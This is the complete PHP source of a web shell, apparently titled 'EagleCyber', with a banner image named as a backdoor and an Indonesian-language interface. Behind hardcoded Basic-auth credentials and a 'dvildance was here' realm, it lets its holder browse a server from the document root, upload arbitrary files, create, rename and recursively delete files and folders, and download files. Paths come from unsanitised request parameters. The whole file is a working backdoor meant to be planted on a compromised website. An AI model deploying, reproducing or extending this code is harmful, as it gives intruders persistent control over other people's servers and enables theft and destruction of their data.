<?php
// --- pop-up

$user = "LDII354@";

$pass = "LDII354@";

 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))

 {

  header("WWW-Authenticate: Basic realm=\"dvildance was here\"");

  header("HTTP/1.0 401 Unauthorized");

  exit();

 }

// --- php shell 
    function Rootpath() {
        return $_SERVER['DOCUMENT_ROOT'];
    }

    function HitungFileSize($Size) {
        if ($Size < 1024) {
            return $Size . " byte" ;
        } else if ($Size < 1024 * 1024) {
            $Hasil = round($Size / 1024,2) ;
            return $Hasil . " KB" ;
        } else if ($Size < 1024 * 1024 * 1024) {
            $Hasil = round($Size / 1024 / 1024,2) ;
            return $Hasil . " MB" ;
        } else if ($Size < 1024 * 1024 * 1024 * 1024) {
            $Hasil = round($Size / 1024 / 1024 / 1024,2) ;
            return $Hasil . " GB" ;
        }
    }

    function BersihkanPath($Path) {
        $Char = substr($Path,0,1);

        if ($Char === "/") {
            $Path = substr ($Path,1);
        }

        return $Path;

    }

    function AmbilParentFolder ($Path) {
        $array = explode("/", $Path);
        $parent = null;
        $i=0;
        while($i < (count($array) - 1)) {
            $parent .= "/" . $array [$i] ;
            $i += 1 ;
        }
        return BersihkanPath($parent);
    }

    function ScanFolder($Path) {
        
        $LinkFile = NULL;
        $IsiTable = NULL;
        $TableFolder = NULL;
        $TableFile = Null;

        if (isset($_GET["p"]) === TRUE) {
            if ($_GET["p"] === "") {
                
            } else {
                $LinkFile .= $_GET["p"];
                $Path .= "/" . $_GET["p"];
            }
            $ListFile = scandir($Path);
        } else {
            $ListFile = scandir($Path);
        }
        
        foreach ($ListFile as $File) {
            if ($File === '.') {
                //Tidak Ada Perintah Di Eksekusi
            } elseif ($File === '..') {
                if ($Path === Rootpath()) {
                    // Kalau sama dengan RootPath, Dilewatin aja
                } else {
                    $IsiTable = '<tr>
                        <td><a href="?p='.AmbilParentFolder($_GET["p"]).'" class="text-decoration-none text-reset"><i class="bi bi-arrow-90deg-left"></i> ..</a></td>
                        <td></td>
                        <td></td>
                        <td></td>
                        <td></td>
                    </tr>';
                }
            } else {
                $FilePath = $Path . "/". $File;
                if (filetype($FilePath) == 'dir') {
                    $TableFolder .=    '<tr>
                                        <td><a href="?p='.BersihkanPath($LinkFile . "/" . $File).'" class="text-decoration-none text-reset"><i class="bi bi-folder"></i> '.$File.'</a></td>
                                        <td>Folder</td>
                                        <td>'.date ("d F Y H:i:s", filemtime($FilePath)).'</td>
                                        <td>'.decoct(fileperms($FilePath) & 0777).'</td>
                                        <td>
                                            <button type="button" class="btn btn-light" data-bs-toggle="modal"
                                            data-bs-target="#Renaming" data-bs-toggle="tooltip" title="Rename" id="RenameButton" data-id="'.$File.'">
                                                <i class="bi bi-pencil-square"></i></button>
                                            <button type="button" class="btn btn-light" data-bs-toggle="modal"
                                            data-bs-target="#Delete" data-bs-toggle="tooltip" title="Delete" id="DeleteButton" data-id="'.$File.'" data-type="Folder">
                                                <i class="bi bi-trash3"></i></button>
                                        </td>
                                    </tr>';
                } else {
                    $TableFile .=     '<tr>
                                        <td><i class="bi bi-file-earmark"></i> '.$File.'</td>
                                        <td>'.HitungFileSize(filesize($FilePath)).'</td>
                                        <td>'.date ("d F Y H:i:s", filemtime($FilePath)).'</td>
                                        <td>'.decoct(fileperms($FilePath) & 0777).'</td>
                                        <td>
                                            <a href="?DL='.$File.'" class="text-decoration-none text-reset"><button type="button" class="btn btn-light" data-bs-toggle="tooltip" title="Download">
                                                <i class="bi bi-download"></i></button></a>
                                            <button type="button" class="btn btn-light" data-bs-toggle="modal"
                                            data-bs-target="#Renaming" data-bs-toggle="tooltip" title="Rename" id="RenameButton" data-id="'.$File.'">
                                                <i class="bi bi-pencil-square"></i></button>
                                            <button type="button" class="btn btn-light" data-bs-toggle="modal"
                                            data-bs-target="#Delete" data-bs-toggle="tooltip" title="Delete" id="DeleteButton" data-id="'.$File.'" data-type="File">
                                                <i class="bi bi-trash3"></i></button>
                                        </td>
                                    </tr>';
                }
                
            }
        }
        $IsiTable .= $TableFolder . $TableFile ;
        return $IsiTable ;
    }

    function NgisiBreadCrumb() {
        if (isset($_GET["p"])) {
            if ($_GET["p"] == "") {

            } else {
                $array = explode("/", $_GET["p"]);
                $parent = null;
                $i=0;
                $isiBreadCrumb = null;
                while($i < (count($array))) {
                    $parent .= "/" . $array [$i] ;
                    $parent = BersihkanPath($parent);
                    $isiBreadCrumb .= '<li class="breadcrumb-item"><a href="?p='.$parent.'" class="text-decoration-none text-reset" >'.$array [$i].'</a></li>' ;
                    $i += 1 ;
                }

                return $isiBreadCrumb;
            }
        }
    }

    function Pathing () {
        $Root = Rootpath();
        $PosisiSekarang = getcwd();
        $Path = null;

        $PosisiSekarang = str_replace("\\","/",$PosisiSekarang);
        
        $ArrayRoot = explode("/",$Root) ;
        $ArrayPosisi = explode("/",$PosisiSekarang) ;

        $i = count($ArrayPosisi) ;

        while ($i > count($ArrayRoot)) {
            $Path .= "../";
            $i -= 1 ;
        }

        if (isset($_GET["p"])) {
            $Path .= $_GET["p"] ;
        }

        $Path .= "/";
        
        return $Path ;

    }

    function DeleteFolder($Path) {

        $ListFile = scandir($Path);
    
        foreach ($ListFile as $File) {
            $FilePath = $Path . "/". $File;
            if($File == "." or $File == "..") {

            }else {
                if (filetype($FilePath) == 'dir') {
                    DeleteFolder($FilePath) ;
                } else {
                    unlink($FilePath);
                }
            }
        }
        
        rmdir($Path) ;
    }

    function DownloadFile () {
        if (isset($_GET["DL"])) {
            $filename = Pathing() . $_GET["DL"] ;
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header("Cache-Control: no-cache, must-revalidate");
            header("Expires: 0");
            header('Content-Disposition: attachment; filename="'.basename($filename).'"');
            header('Content-Length: ' . filesize($filename));
            header('Pragma: public');
        }
    }

    function ButtonAction() {
        if(isset($_POST["submit"])) {
            $action = $_POST["action"];
            if ($action == "Upload File") {
                $target_dir = Pathing();
                $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
                move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
            } else if ($action == "New File") {
                $NamaFile = $_POST["NamaFile"];
                $myfile = fopen(Pathing() . $NamaFile, "w") ;
            } else if ($action == "New Folder") {
                $NamaFolder = $_POST["NamaFolder"];
                mkdir(Pathing() . $NamaFolder);
            } else if ($action == "Rename") {
                $OldName = $_POST["OldName"];
                $NewName = $_POST["NewName"];
                rename(Pathing() . $OldName, Pathing() . $NewName) ;
            } else if ($action == "Delete") {
                $Namaitem = $_POST["NamaItem"];
                $Type = $_POST["Type"];
                if ($Type == "File") {
                    unlink(Pathing(). $Namaitem);
                } else {
                    DeleteFolder(Pathing(). $Namaitem);
                }
            }
        }
    }
?>


<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>EagleCyber</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <link rel="icon" type="image/x-icon" href="https://i.ibb.co/Lgk23wW/favicon.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
</head>

<body>
    <?php ButtonAction(); ?>
    <?php DownloadFile(); ?>
    <div class="container">
        <section id="Header">
            <img src="https://i.ibb.co/d00fQ87/Logo-Back-Door.png" class="img-fluid rounded mx-auto d-block mb-4"
                alt="LogoBanner">
            <div class="row fs-5 fw-bold">
                <div class="col-8">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="?p=" class="text-decoration-none text-reset"><i
                                        class="bi bi-house"></i></a></li>
                            <?php echo''.NgisiBreadCrumb() ; ?>
                        </ol>
                    </nav>
                </div>
                <div class="col-4 text-end">
                    <button type="button" class="btn btn-light btn-lg" data-bs-toggle="modal"
                        data-bs-target="#ModalUploadFile" data-bs-toggle="tooltip" title="Upload File">
                        <i class="bi bi-cloud-upload"></i></button>
                    <button type="button" class="btn btn-light btn-lg" data-bs-toggle="modal"
                        data-bs-target="#CreateNewFile" data-bs-toggle="tooltip" title="Create New File">
                        <i class="bi bi-file-earmark-plus"></i></button>
                    <button type="button" class="btn btn-light btn-lg" data-bs-toggle="modal"
                        data-bs-target="#CreateNewFolder" data-bs-toggle="tooltip" title="Create New Folder">
                        <i class="bi bi-folder-plus"></i></button>
                </div>
            </div>
        </section>

        <section id="Table">
            <table class="table table-hover mt-3">
                <thead>
                    <tr>
                        <th scope="col">Name</th>
                        <th scope="col">Size</th>
                        <th scope="col">Last Modified</th>
                        <th scope="col">Permission</th>
                        <th scope="col">Option</th>
                    </tr>
                </thead>
                <tbody>
                    <?php echo''.ScanFolder(Rootpath()) ;?>
                </tbody>
            </table>
        </section>

        <footer>
            <p class="text-center">© 2022 Copyright EagleCyber!</p>
        </footer>

    </div>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous">
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous">
    </script>

    <script>
    $(document).on("click", "#RenameButton", function() {
        let id = $(this).data('id');
        $("#OldName").val(id);
        $("#NewName").val(id);
    });
    </script>

    <script>
    $(document).on("click", "#DeleteButton", function() {
        let id = $(this).data('id');
        let type = $(this).data('type');
        $("#NamaItem").val(id);
        $("#Type").val(type);
    });
    </script>
</body>

<!-- Modal Upload File -->
<div class="modal fade" id="ModalUploadFile" tabindex="-1" aria-labelledby="ModalUploadFile" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="ModalUploadFile">Upload File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form action="" method="post" enctype="multipart/form-data">
                <div class="modal-body">
                    <div>
                        <input type="text" class="form-control" id="action" name="action" value="Upload File" hidden>
                        <input class="form-control form-control-lg" id="fileToUpload" name="fileToUpload" type="file">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="submit" name="submit" class="btn btn-primary">Upload</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Modal New File -->
<div class="modal fade" id="CreateNewFile" tabindex="-1" aria-labelledby="CreateNewFile" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="CreateNewFile">Create New File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form action="" method="post">
                <div class="modal-body">
                    <div>
                        <input type="text" class="form-control" id="action" name="action" value="New File" hidden>
                        <input class="form-control form-control-lg" id="NamaFile" name="NamaFile" type="Text"
                            placeholder="Contoh.txt">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="submit" name="submit" class="btn btn-primary">Create New File</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Modal New Folder -->
<div class="modal fade" id="CreateNewFolder" tabindex="-1" aria-labelledby="CreateNewFolder" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="CreateNewFolder">Create New Folder</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form action="" method="post">
                <div class="modal-body">
                    <div>
                        <input type="text" class="form-control" id="action" name="action" value="New Folder" hidden>
                        <input class="form-control form-control-lg" id="NamaFolder" name="NamaFolder" type="Text"
                            placeholder="Nama Folder">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="submit" name="submit" class="btn btn-primary">Create New Folder</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Modal Rename -->
<div class="modal fade" id="Renaming" tabindex="-1" aria-labelledby="Renaming" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="Renaming">Renaming</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form action="" method="post">
                <div class="modal-body">
                    <div>
                        <input type="text" class="form-control" id="action" name="action" value="Rename" hidden>
                        <input type="text" class="form-control" id="OldName" name="OldName" hidden>
                        <input class="form-control form-control-lg" id="NewName" name="NewName" type="Text"
                            placeholder="New Name">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="submit" name="submit" class="btn btn-primary">Rename Now</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Modal Delete -->
<div class="modal fade" id="Delete" tabindex="-1" aria-labelledby="Delete" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="Renaming">Delete</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form action="" method="post">
                <div class="modal-body">
                    <div>
                        <input type="text" class="form-control" id="action" name="action" value="Delete" hidden>
                        <input type="text" class="form-control" id="NamaItem" name="NamaItem" hidden>
                        <input type="text" class="form-control" id="Type" name="Type" hidden>
                        <p> Apakah anda yakin ingin menghapusnya ? </p>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="submit" name="submit" class="btn btn-primary">Delete Now</button>
                </div>
            </form>
        </div>
    </div>
</div>

</html>
